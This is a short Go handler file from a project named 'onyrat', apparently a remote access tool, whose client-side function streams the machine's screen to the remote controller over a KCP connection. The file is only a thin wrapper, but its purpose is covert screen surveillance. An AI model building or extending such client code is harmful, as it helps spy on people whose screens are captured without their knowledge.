//go:build client
// +build client

package handlers

import (
	"context"
	"fmt"

	"github.com/Onyz107/onyrat/pkg/commands/videostreaming"
	"github.com/Onyz107/onyrat/pkg/network"
)

func HandleScreenstream(c *network.KCPClient, ctx context.Context) error {
	if err := videostreaming.ScreenstreamSend(c, ctx); err != nil {
		return fmt.Errorf("failed to send screenstream: %w", err)
	}

	return nil
}
